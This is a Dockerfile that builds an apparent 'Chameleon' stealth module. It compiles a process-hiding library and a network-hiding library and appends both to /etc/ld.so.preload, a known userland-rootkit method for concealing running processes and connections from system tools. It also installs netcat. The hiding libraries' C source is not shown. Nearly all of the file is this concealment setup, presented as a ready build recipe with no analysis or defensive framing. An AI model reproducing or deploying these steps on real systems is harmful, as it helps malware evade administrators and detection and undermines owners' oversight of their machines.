FROM ubuntu as baseImage

RUN apt update && apt install -y netcat net-tools python3-pip

# Chameleon builder (stealth module)
FROM baseImage as chameleonBuilder
WORKDIR /opt/src/chameleon

RUN gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
RUN mv libprocesshider.so /usr/local/lib
RUN echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

RUN gcc -Wall -fPIC -shared -o libnetworkhider.so networkhider.c -ldl
RUN mv libnetworkhider.so /usr/local/lib
RUN echo /usr/local/lib/libnetworkhider.so >> /etc/ld.so.preload

ENTRYPOINT [ "/bin/bash" ]